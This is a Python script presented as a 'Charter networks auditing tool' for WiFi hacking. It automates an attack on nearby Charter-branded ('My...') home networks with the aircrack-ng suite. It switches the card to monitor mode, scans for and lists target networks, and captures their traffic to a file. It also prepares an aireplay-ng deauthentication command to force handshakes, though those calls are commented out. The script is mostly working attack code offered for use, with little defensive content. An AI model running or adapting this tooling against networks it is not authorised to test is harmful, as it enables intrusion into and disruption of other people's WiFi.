# WiFi Hacking: The Dangers of Default Passwords by Edward Ayala

import subprocess as sp
import time as t
import signal
import sys
from os import system
from colorama import Fore,Style
import csv

# Variables
ROOT = 'sudo'

# Functions
def welcome():
    # print(Fore.RED)
    # print('          ▀▀▀██████▄▄▄          ')
    # print('                 ▀▀▀████▄       ')
    # print('          ▄███████▀   ▀███▄     ')
    # print('        ▄███████▀       ▀███▄   ')
    # print('      ▄████████           ███▄  ')
    # print('     ██████████▄           ███▌   ██████╗ ██╗   ██╗██████╗     ███████╗██████╗ ███████╗ ██████╗████████╗██████╗ ██╗   ██╗███╗   ███╗    ██╗    ██╗██╗███████╗██╗')
    # print('     ▀█████▀ ▀███▄         ▐███  ██╔═══██╗██║   ██║██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║   ██║████╗ ████║    ██║    ██║██║██╔════╝██║')
    # print('       ▀█▀     ▀███▄       ▐███  ██║   ██║██║   ██║██████╔╝    ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝██║   ██║██╔████╔██║    ██║ █╗ ██║██║█████╗  ██║')
    # print('                 ▀███▄     ███▌  ██║   ██║██║   ██║██╔══██╗    ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██║╚██╔╝██║    ██║███╗██║██║██╔══╝  ██║')
    # print('    ▄██▄           ▀███▄  ▐███   ╚██████╔╝╚██████╔╝██║  ██║    ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║    ╚███╔███╔╝██║██║     ██║')
    # print('  ▄██████▄           ▀███▄███     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝')
    # print(' █████▀▀████▄▄        ▄█████    ')
    # print(' ████▀   ▀▀█████▄▄▄▄█████████▄                                                 A WiFi Auditing Tool By Edward Ayala')
    # print('  ▀▀         ▀▀██████▀▀   ▀▀██  ')            

    print(Fore.BLUE)
    print(' ,--------------------------.')
    print('( Change Your WiFi Password! )   .-.')
    print(' `--------------------------\'     \ \\')
    print('       (_)                         \ \\')
    print('           O                       | |')
    print('             o                     | |    ██████╗        █████╗        ████████╗')
    print('               . /\---/\   _,---._ | |   ██╔════╝       ██╔══██╗       ╚══██╔══╝')
    print("                /^   ^  \,'       \'. ;   ██║            ███████║          ██║   ")
    print('               ( O   O   )           ;   ██║            ██╔══██║          ██║   ')
    print("                `.=o=__,'            \\   ╚██████╗██╗    ██║  ██║██╗       ██║██╗")
    print('                  /         _,--.__   \\   ╚═════╝╚═╝    ╚═╝  ╚═╝╚═╝       ╚═╝╚═╝')
    print("                 /  _ )   ,'   `-. `-. \\     Charter(networks) Auditing Tool")
    print("                / ,' /  ,\'        \ \ \ \             by Edward Ayala")
    print("               / /  / ,'          (,_)(,_)")
    print('              (,;  (,,)')
                                                                                                 
    print(Style.RESET_ALL)
    
def getInterface(choice):
    commands = ['iwconfig']
    process = sp.run(commands, capture_output=True, text=True)
    output = process.stdout.split(' ')
    interface = output[0]
    for x in output:
        if x.__contains__('Mode:'):
            mode = x.split(':')[1]
    if choice == 0:
        return interface
    elif choice == 1:
        return mode
    else:
        print(Fore.BLUE,'Interface:',Fore.LIGHTYELLOW_EX,interface,Fore.BLUE,'Mode:',Fore.LIGHTYELLOW_EX,mode,Style.RESET_ALL)
        checkInterface()

# More variables
interface = getInterface(0)
mode = getInterface(1)

def checkInterface():
    if getInterface(1) == 'Monitor':        
        print(Fore.GREEN,'Interface is in Monitor mode!',Fore.BLUE,'\n Searching for target networks...',Style.RESET_ALL)
        findTarget()
    elif getInterface(1) == 'Managed':
        print(Fore.RED,'Interface is not in Monitor mode',Fore.YELLOW,'\n Changing to Monitor Mode...',Style.RESET_ALL)
        checkProcesses()
        # LOOP HERE ^^^ BAD - kinda fixed but still needs work...

def checkProcesses():
    checkProcessesProc = sp.run(['airmon-ng','check'], capture_output=True, text=True)
    if (checkProcessesProc.stdout.find('F')):
        print(Fore.RED,'Found interfering processes',Fore.BLUE)
        usrInput = input(' Killing processes will disconnect you from the Internet, would you like to continue? (y/n) ')
        if usrInput == 'y' or usrInput == 'yes':
            print(' Killing processes...')
            sp.run(['airmon-ng','check','kill'], capture_output=True)
            t.sleep(5)
            monitorToggle(getInterface(0),0)
        elif usrInput == 'n' or usrInput == 'no':
            print('Attempting to toggle Monitor mode, this may not work without killing the interfering processes.')
            monitorToggle(getInterface(0),0)
    else:
        print('No interfering processes - GOOD TO GO')

def monitorToggle(interface, mode):     # Runs airmon-ng to start/stop Monitor mode
    if mode == 0:
        sp.run(['airmon-ng','start',getInterface(0)], capture_output=True)   # Toggle Monitor Mode
        print(Fore.GREEN,'Monitor Mode Enabled!',Style.RESET_ALL)
        checkInterface()
    else:
        sp.run(['airmon-ng','stop',getInterface(0)], capture_output=True)    # Toggle Managed Mode
        sp.run(['NetworkManager'])     # Restart NetworkMananger to connect to Internet
        print(Fore.GREEN,'Monitor Mode Disabled & Internet Capabilities Re-Enabled',Style.RESET_ALL)

def findTarget():
    command = ['airodump-ng','-K','1','-R',"'(My.)'",'-w','targets','--output-format','csv',getInterface(0),]
    process = sp.Popen(command, stdout=sp.PIPE, text=True)
    # print(Fore.BLUE,'Scanning for networks')
    t.sleep(1)
    print(Fore.RED,'Scanning for networks...')
    t.sleep(1)
    print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...')
    t.sleep(1)
    print(Fore.YELLOW,'Scanning for networks...')
    t.sleep(1)
    print(Fore.LIGHTGREEN_EX,'Scanning for networks...')
    t.sleep(1)
    print(Fore.GREEN,'Scanning for networks...')
    t.sleep(1)
    print(Fore.CYAN,'Scanning for networks...')
    t.sleep(1)
    print(Fore.BLUE,'Scanning for networks...')
    t.sleep(1)
    print(Fore.CYAN,'Scanning for networks...')
    t.sleep(1)
    print(Fore.GREEN,'Scanning for networks...')
    t.sleep(1)
    print(Fore.LIGHTGREEN_EX,'Scanning for networks...')
    t.sleep(1)
    print(Fore.YELLOW,'Scanning for networks...')
    t.sleep(1)
    print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...')
    t.sleep(1)
    print(Fore.RED,'Scanning for networks...')
    # Scan for about 12 seconds for best results
    process.send_signal(signal.SIGINT)
    print(Fore.BLUE,'Scanning complete!',Style.RESET_ALL)
    readFile()

def findFile():
    process = sp.run('ls | grep target', capture_output=True, text=True, shell=True)
    ls = process.stdout.split('\n')
    count = 0
    for x in ls:
        if x == '':
            ls.remove(x)
            count -= 1
        count += 1
    if count > 1:
        print(Fore.CYAN,'There is',count,'target file(s):')
        print(Fore.BLUE,'+------------------------+',Fore.WHITE)
        for x in ls:
            print(Fore.BLUE, '|', Fore.WHITE, ls.index(x), Fore.BLUE, '|', Fore.WHITE, x, Fore.BLUE,'|', Style.RESET_ALL)
        print(Fore.BLUE,'+------------------------+',Fore.CYAN)
        select = int(input(' Select a file: '))
        print(Fore.YELLOW, ls[select], Style.RESET_ALL)
        return ls[select]
    else:
        return ls[0]
    

def readFile():
    # initial internal variables - file, count, networks, & choice
    file = findFile()
    count = 0
    networks = {}
    choice = ''
    with open(file, 'r') as csvfile: 
        # creating a csv reader object 
        csvreader = csv.reader(csvfile) 

        # print header
        print(Fore.BLUE,'+---#--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
        for row in csvreader:
            # skip empty rows
            if not row:
                continue
            # skip first row
            elif row.__contains__('BSSID'):
                continue
            # skip second row
            elif row.__contains__('Station MAC'):
                continue
            # skip networks without ESSID/Name
            elif row[6] == '':
                continue
            # skip networks that are not Charter networks
            elif 'My' not in row[6]:
                continue
            # display and put networks in a dictionary that conatins a list of properties
            else:
                count += 1 
                BSSID = row[5]  # Network MAC address | either 0 or 5... idk yet
                Power = row[3].strip()  # Network Power level
                Channel = row[4].strip()    # Network Channel
                Name = row[6]   # Network ESSID/Name
                print(Fore.BLUE, '| ', Fore.WHITE, count, ' ', BSSID, '       ', Power, '               ', Channel, '        ', Name, Fore.BLUE, '      |', Fore.WHITE)
                print(Fore.BLUE,'+-------------------------------------------------------------------------------------------+',Fore.CYAN)
                networks[count] = [BSSID,Power,Channel,Name]
    print(networks)

    choice  = int(input('Select a network: '))
    print('Selected:',networks[choice])
    attack(networks[choice])

def attack(target):
    # internal variables - BSSID, Channel, Name, & fileName
    BSSID = target[0]
    Channel = target[2]
    Name = target[3]
    fileName = 'capture_'+Name
    interface = getInterface(0)

    # Commands - airodump-ng: capture data & aireplay-ng: deauth network
    command_1 = ['airodump-ng','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
    command_2 = ['aireplay-ng','--deauth',5,'-a',BSSID,interface]

    process_1 = sp.Popen(command_1)
    # process_2 = sp.run(command_2)
    # process_2 = sp.Popen(command_2)

    t.sleep(2)
    print(Fore.RED,'Attacking network...')
    t.sleep(2)
    print(Fore.LIGHTMAGENTA_EX,'Attacking network...')
    t.sleep(2)
    print(Fore.YELLOW,'Attacking network...')
    t.sleep(2)
    print(Fore.LIGHTGREEN_EX,'Attacking network...')
    t.sleep(2)
    # sp.run(command_2)
    print(Fore.GREEN,'Attacking network...')
    t.sleep(2)
    print(Fore.CYAN,'Attacking network...')
    t.sleep(2)
    print(Fore.BLUE,'Attacking network...')
    t.sleep(2)
    print(Fore.CYAN,'Attacking network...')
    t.sleep(2)
    print(Fore.GREEN,'Attacking network...')
    t.sleep(2)
    # sp.run(command_2)
    print(Fore.LIGHTGREEN_EX,'Attacking network...')
    t.sleep(2)
    print(Fore.YELLOW,'Attacking network...')
    t.sleep(2)
    print(Fore.LIGHTMAGENTA_EX,'Attacking network...')
    t.sleep(2)
    print(Fore.RED,'Attacking network...')
    
    process_1.send_signal(signal.SIGINT)


def start():
    getInterface(None) # prints interface information



welcome()       # prints title
# start()         # Start the process/function/procedure tree

# -------SANDBOX--------
# readFile()

# monitorToggle(getInterface(0),1)